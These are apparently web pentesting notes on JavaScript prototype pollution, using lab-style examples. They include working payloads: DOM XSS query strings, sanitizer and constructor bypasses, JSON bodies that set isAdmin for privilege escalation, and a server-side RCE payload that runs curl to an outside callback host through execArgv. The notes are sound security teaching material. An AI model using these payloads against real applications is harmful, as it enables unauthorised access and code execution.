---
title: Prototype pollution
source_url: https://notes.incendium.rocks/pentesting-notes/web/prototype-pollution
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: web
---
Prototype pollution is a JavaScript vulnerability that enables an attacker to add arbitrary properties to global object prototypes, which may then be inherited by user-defined objects.

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FnLK8difSlYx5BIK6w0O5%2Fprototype-pollution-infographic.svg?alt=media&amp;token=bbf7e6ba-e14f-4e9b-bf5a-7505b0d32c85" alt=""><figcaption></figcaption></figure>

Although prototype pollution is often unexploitable as a standalone vulnerability, it lets an attacker control properties of objects that would otherwise be inaccessible. If the application subsequently handles an attacker-controlled property in an unsafe way, this can potentially be chained with other vulnerabilities. In client-side JavaScript, this commonly leads to DOM XSS, while server-side prototype pollution can even result in remote code execution.

## DOM Invader

DOM Invader provides a number of features to help you test for client-side [prototype pollution](https://portswigger.net/web-security/prototype-pollution) vulnerabilities. These enable you to perform the following key tasks:

* Automatically detect sources for prototype pollution in the URL and any JSON objects sent via web messages. This includes detecting alternative techniques using the same source.
* Generate a proof of concept by polluting the `Object.prototype` using any discovered sources. You can then manually verify the vulnerability via the browser console.
* Scan for potential gadgets that you can use to craft an exploit.

Setup: <https://portswigger.net/burp/documentation/desktop/tools/dom-invader/enabling>

## Client-side prototype pollution

### DOM XSS via client-side prototype pollution

DOM Invader finds two sources:

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FkL2DlYKUYHEK3IN7O8jK%2Fimage.png?alt=media&amp;token=41ae2bbc-722b-43ff-95e2-96d6bb807c18" alt=""><figcaption></figcaption></figure>

For these sources, we can scan for gadgets (in order to exploit these sources):

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FizdaUhfuC3lURdNzhH4f%2Fimage.png?alt=media&amp;token=cfa72dd0-e566-4517-b079-96a572188d2b" alt=""><figcaption></figcaption></figure>

It finds a Sink (script.src)

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FFAkKTba6nVaK6m1D6uyB%2Fimage.png?alt=media&amp;token=24742f45-23ef-4ded-9d74-7a689a502836" alt=""><figcaption></figcaption></figure>

DOM Invader makes it very easy for us, we can now just click "Exploit" and it will chain a XSS with the prototype pollution:

```
https://vulnerable-website.com/?__proto__[transport_url]=data%3A%2Calert%281%29
```

### Client-side prototype pollution via flawed sanitization

An obvious way in which websites attempt to prevent prototype pollution is by sanitizing property keys before merging them into an existing object. However, a common mistake is failing to recursively sanitize the input string. For example, consider the following URL:

```
vulnerable-website.com/?__pro__proto__to__.gadget=payload
```

If the sanitization process just strips the string `__proto__` without repeating this process more than once, this would result in the following URL, which is a potentially valid prototype pollution source:

```
vulnerable-website.com/?__proto__.gadget=payload
```

Example poor JS filter function:

```javascript
function sanitizeKey(key) {
    let badProperties = ['constructor','__proto__','prototype'];
    for(let badProperty of badProperties) {
        key = key.replaceAll(badProperty, '');
    }
    return key;
}
```

### Prototype pollution via Object.defineProperty() <a href="#prototype-pollution-via-object-defineproperty" id="prototype-pollution-via-object-defineproperty"></a>

Developers with some knowledge of prototype pollution may attempt to block potential gadgets by using the `Object.defineProperty()` method. This enables you to set a non-configurable, non-writable property directly on the affected object as follows:

```javascript
Object.defineProperty(vulnerableObject, 'gadgetProperty', {
    configurable: false,
    writable: false
})
```

In this case, an attacker may be able to bypass this defense by polluting `Object.prototype` with a malicious `value` property. If this is inherited by the descriptor object passed to `Object.defineProperty()`, the attacker-controlled value may be assigned to the gadget property after all.

```http
vulnerable-website.com/?__proto__[value]=data%3A%2Calert%281%29
```

## Server-side prototype pollution

JavaScript was originally a client-side language designed to run in browsers. However, due to the emergence of server-side runtimes, such as the hugely popular Node.js, JavaScript is now widely used to build servers, APIs, and other back-end applications. Logically, this means that it's also possible for prototype pollution vulnerabilities to arise in server-side contexts.

### Detecting server-side prototype pollution via polluted property reflection <a href="#detecting-server-side-prototype-pollution-via-polluted-property-reflection" id="detecting-server-side-prototype-pollution-via-polluted-property-reflection"></a>

`POST` or `PUT` requests that submit JSON data to an application or API are prime candidates for this kind of behavior as it's common for servers to respond with a JSON representation of the new or updated object. In this case, you could attempt to pollute the global `Object.prototype` with an arbitrary property as follows:

```http
POST /user/update HTTP/1.1
Host: vulnerable-website.com
...
{
    "user":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener",
    "__proto__":{
        "foo":"bar"
    }
}
```

If the website is vulnerable, your injected property would then appear in the updated object in the response. We can perhaps use this vulnerability to escalate our privileges to admin:

```javascript
if (this.status == 200) {
    const header = document.createElement("h3");
    header.textContent = 'Updated Billing and Delivery Address';
    div.appendChild(header);
    formParent.appendChild(div);
    for (const [key, value] of Object.entries(responseJson).filter(e => e[0] !== 'isAdmin')) {
        const label = document.createElement("label");
        label.textContent = `${toLabel(key)}`;
        div.appendChild(label);
        const p = document.createElement("p");
        p.textContent = `${JSON.stringify(value).replaceAll("\"", "")}`;
        div.appendChild(p);
    }
}
```

Notice that the Object.entries looks at "isAdmin". We can set this to true using prototype pollution:

```json
{
   "address_line_1":"Wiener HQ",
   "address_line_2":"One Wiener Way",
   "city":"Wienerville",
   "postcode":"BU1 1RPR",
   "country":"UK",
   "sessionId":"---",
   "__proto__":{
      "isAdmin":"True"
   }
}
```

Result:

```json
{
   "username":"wiener",
   "firstname":"Peter",
   "lastname":"Wiener",
   "address_line_1":"Wiener HQ",
   "address_line_2":"One Wiener Way",
   "city":"Wienerville",
   "postcode":"BU1 1RPR",
   "country":"UK",
   "isAdmin":true
}
```

### Detecting server-side prototype pollution without polluted property reflection

If you can find an object whose properties are visible in a response, you can use this to probe for sources. In the following example, we'll use UTF-7 encoding and a JSON source.

1. Add an arbitrary UTF-7 encoded string to a property that's reflected in a response. For example, `foo` in UTF-7 is `+AGYAbwBv-`.

```json
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"+AGYAbwBv-"
}
```

2. Send the request. Servers won't use UTF-7 encoding by default, so this string should appear in the response in its encoded form.
3. Try to pollute the prototype with a `content-type` property that explicitly specifies the UTF-7 character set:

```json
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"default",
    "__proto__":{
        "content-type": "application/json; charset=utf-7"
    }
}
```

4. Repeat the first request. If you successfully polluted the prototype, the UTF-7 string should now be decoded in the response:

```json
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"foo"
}
```

### Bypassing flawed input filters for server-side prototype pollution

1. Use the Server-Side prototype pollution scanner extension in Burp to scan a request
2. If you find a source, instead of specifying \_\_prototype\_\_ directly, use the constructor:

```json
"constructor": {
    "prototype": {
        "isAdmin":true
    }
}
```

This suggests that the object doesn't have its own `isAdmin` property, but has instead inherited it from the polluted prototype.

### Remote code execution via server-side prototype pollution <a href="#remote-code-execution-via-server-side-prototype-pollution" id="remote-code-execution-via-server-side-prototype-pollution"></a>

While client-side prototype pollution typically exposes the vulnerable website to [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based), server-side prototype pollution can potentially result in remote code execution (RCE).  Try polluting the prototype with a malicious `execArgv` property that adds the `--eval` argument to the spawned child process. Use this to call the `execSync()` sink, passing in a command that triggers an interaction with the public Burp Collaborator server. For example:

```json
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('curl https://ID.oastify.com')"
    ]
}
```

If their are successful HTTP requests coming in we can assume RCE. more info: <https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#pp2rce-via-env-vars--cmdline>
